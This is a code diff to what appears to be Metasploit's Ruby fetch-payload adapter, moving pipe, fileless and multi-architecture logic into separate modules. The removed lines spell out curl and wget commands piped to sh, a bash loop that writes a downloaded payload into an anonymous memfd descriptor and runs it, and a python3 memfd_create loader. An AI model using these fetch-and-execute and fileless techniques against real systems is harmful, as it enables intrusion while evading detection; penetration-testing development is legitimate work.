@@ -5,6 +5,10 @@ module Msf
   #
   ###
   module Payload::Adapter::Fetch
+    include Msf::Payload::Adapter::Fetch::Fileless
+    include Msf::Payload::Adapter::Fetch::Multi
+    include Msf::Payload::Adapter::Fetch::Pipe
+
     def initialize(*args)
       super
       register_options(
@@ -74,10 +78,6 @@ module Msf
       "#{srvnetloc}/#{uri}"
     end
 
-    def _download_pipe(uripath)
-      "#{srvnetloc}/#{uripath}"
-    end
-
     def fetch_bindhost
       datastore['FetchListenerBindAddress'].blank? ? srvhost : datastore['FetchListenerBindAddress']
     end
@@ -88,61 +88,6 @@ module Msf
 
     def fetch_bindnetloc
       Rex::Socket.to_authority(fetch_bindhost, fetch_bindport)
-    end
-
-    def pipe_supported_binaries
-      # this is going to expand when we add psh support
-      return %w[CURL] if windows?
-
-      %w[WGET CURL]
-    end
-
-    def os_arches(meterp_arch)
-      # multiple `uname -m` values map to the same payload arch
-      # we will probably need to expand this
-      case meterp_arch
-      when ARCH_AARCH64
-        return ['aarch64']
-      when ARCH_ARMBE
-        return ['armbe']
-      when ARCH_ARMLE
-        return ['armv5l', 'armv6l', 'armv7l']
-      when ARCH_MIPS64
-        return ['mips64']
-      when ARCH_MIPSBE
-        return ['mipsbe']
-      when ARCH_MIPSLE
-        return ['mips']
-      when ARCH_PPC
-        return ['ppc']
-      when ARCH_PPCE500V2
-        return ['ppce500v2']
-      when ARCH_PPC64LE
-        return ['ppc64le']
-      when ARCH_X64
-        return ['x64', 'x86_64']
-      when ARCH_X86
-        return ['x86']
-      when ARCH_ZARCH
-        return ['zarch']
-      end
-    end
-
-    def multi_arches
-      arches = []
-      arches << ARCH_AARCH64
-      arches << ARCH_ARMBE
-      arches << ARCH_ARMLE
-      arches << ARCH_MIPS64
-      arches << ARCH_MIPSBE
-      arches << ARCH_MIPSLE
-      arches << ARCH_PPC
-      arches << ARCH_PPCE500V2
-      arches << ARCH_PPC64LE
-      arches << ARCH_X64
-      arches << ARCH_X86
-      arches << ARCH_ZARCH
-      arches
     end
 
     def generate(opts = {})
@@ -192,19 +137,6 @@ module Msf
         end
       end
       cmd
-    end
-
-    def generate_pipe_command(uri)
-      # TODO: Make a check method that determines if we support a platform/server/command combination
-
-      case datastore['FETCH_COMMAND'].upcase
-      when 'WGET'
-        return _generate_wget_pipe(uri)
-      when 'CURL'
-        return _generate_curl_pipe(uri)
-      else
-        fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
-      end
     end
 
     def generate_fetch_commands(uri)
@@ -266,12 +198,6 @@ module Msf
       return default_srvuri if datastore['FETCH_PIPE'] || datastore['FETCH_URIPATH'].blank?
 
       datastore['FETCH_URIPATH']
-    end
-
-    def pipe_srvuri
-      return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?
-
-      default_srvuri('pipe')
     end
 
     def windows?
@@ -364,37 +290,6 @@ module Msf
       _execute_add(get_file_cmd)
     end
 
-    # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
-    def _generate_fileless(get_file_cmd)
-      # get list of all $USER's processes
-      cmd = 'FOUND=0'
-      cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
-      # already found anonymous file where we can write
-      cmd << '; do if [ $FOUND -eq 0 ]'
-
-      # look for every symbolic link with write rwx permissions
-      # if found one, try to download payload into the anonymous file
-      # and execute it
-      cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
-      cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
-      cmd << "; then if $(#{get_file_cmd} >/dev/null)"
-      cmd << '; then $f'
-      cmd << '; FOUND=1'
-      cmd << '; break'
-      cmd << '; fi'
-      cmd << '; fi'
-      cmd << '; done'
-      cmd << '; fi'
-      cmd << '; done'
-
-      cmd
-    end
-
-    # same idea as _generate_fileless function, but force creating anonymous file handle
-    def _generate_fileless_python(get_file_cmd)
-      %<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'>
-    end
-
     def _generate_curl_command(uri)
       case fetch_protocol
       when 'HTTP'
@@ -407,19 +302,6 @@ module Msf
         fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
       end
       _execute_add(get_file_cmd)
-    end
-
-    def _generate_curl_pipe(uri)
-      execute_cmd = 'sh'
-      execute_cmd = 'cmd' if windows?
-      case fetch_protocol
-      when 'HTTP'
-        return "curl -s http://#{_download_pipe(uri)}|#{execute_cmd}"
-      when 'HTTPS'
-        return "curl -sk https://#{_download_pipe(uri)}|#{execute_cmd}"
-      else
-        fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
-      end
     end
 
     def _generate_ftp_command(uri)
@@ -436,12 +318,12 @@ module Msf
       _execute_add(get_file_cmd)
     end
 
-    def _generate_tftp_command
+    def _generate_tftp_command(uri)
       _check_tftp_port
       case fetch_protocol
       when 'TFTP'
         if windows?
-          fetch_command = _execute_win("tftp -i #{srvhost} GET #{srvuri} #{_remote_destination}")
+          fetch_command = _execute_win("tftp -i #{srvhost} GET #{uri} #{_remote_destination}")
         else
           _check_tftp_file
           if datastore['FETCH_FILELESS'] != 'none' && linux?
@@ -481,42 +363,6 @@ module Msf
       end
 
       _execute_add(get_file_cmd)
-    end
-
-    def _generate_wget_pipe(uri)
-      case fetch_protocol
-      when 'HTTPS'
-        return "wget --no-check-certificate -qO- https://#{_download_pipe(uri)}|sh"
-      when 'HTTP'
-        return "wget -qO- http://#{_download_pipe(uri)}|sh"
-      else
-        fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
-      end
-    end
-
-    def _generate_multi_commands(arch_payloads = [])
-      # There is a great deal of room for improvement here.
-      script = 'archinfo=$(uname -m);'
-      arch_payloads.each do |srv_entry|
-        vprint_status("Adding #{srv_entry[:uri]} for #{srv_entry[:arch]}")
-        os_arches(srv_entry[:arch]).each do |os_arch|
-          script << "if [ #{os_arch} = $archinfo ]; then (#{generate_fetch_commands(srv_entry[:uri])}); fi; "
-          # If I add an exit to this so that it leaves after launching, FETCH_FILELESS bash fails
-        end
-      end
-      print_status(script)
-      script
-    end
-
-    def _generate_bruteforce_multi_commands(arch_payloads = [])
-      # Don't bother trying to figure out the OS arch.... just try to run them all.
-      script = ''
-      arch_payloads.each do |srv_entry|
-        vprint_status("Adding #{srv_entry[:uri]} for #{srv_entry[:arch]}")
-        script << generate_fetch_commands(srv_entry[:uri]).to_s
-      end
-      print_status(script)
-      script
     end
 
     def _remote_destination
